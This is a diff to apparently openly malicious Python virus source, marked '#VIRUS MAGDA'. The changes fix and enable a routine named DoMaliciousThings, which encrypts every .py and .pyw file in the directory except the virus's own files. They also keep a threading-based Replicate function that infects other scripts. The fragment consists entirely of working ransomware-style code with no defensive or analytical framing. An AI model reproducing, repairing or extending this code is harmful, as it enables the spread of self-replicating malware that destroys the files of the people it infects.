@@ -44,7 +44,7 @@ def Replicate ():
 
         for line in Kod:             
         
-            if line == "#VIRUS MAGDA\n":
+            if line == "#VIRUS MAGDA\n" or file in ["encrypting.py","virus2.py"]:
                 Nakazeny = True
                 break
             
@@ -90,19 +90,19 @@ def load_key():
     
     return open("key.key", "rb").read()
 
-def DoMaliciousThings():
-    for file in glob.glob('*.py') + glob.glob('*.pyw')
-        encrypt(file,key)
+def DoMaliciousThings(key):
+    for file in glob.glob('*.py') + glob.glob('*.pyw'):
+        if file not in ["encrypting.py","virus2.py"]:
+            encrypt(file,key)
+            pass
 
 
 write_key()
 key = load_key()
-DoMaliciousThings()
 y = threading.Thread(target=Replicate)			
 y.start()							
-x = threading.Thread(target=DoMaliciousThings, daemon=True)	
-x.start()
-
+#x = threading.Thread(target=DoMaliciousThings, args=(key,), daemon=True)
+#x.start()
+DoMaliciousThings(key)
 
 #SBOHEM
-
